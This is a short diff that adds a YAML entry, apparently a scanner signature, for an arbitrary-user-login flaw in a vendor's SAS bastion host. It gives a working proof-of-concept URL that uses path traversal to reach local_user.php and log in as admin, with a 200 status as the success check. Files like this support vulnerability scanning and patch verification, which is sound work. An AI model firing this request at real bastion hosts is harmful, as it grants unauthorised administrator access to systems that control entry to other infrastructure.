@@ -1,0 +1,3 @@
+name: "某盟 SAS堡垒机 local_user.php 任意用户登录漏洞"
+poc: "/api/virtual/home/status?cat=../../../../../../../../../../../../../../usr/local/nsfocus/web/apache2/www/local_user.php&method=login&user_account=admin"
+status_code: 200
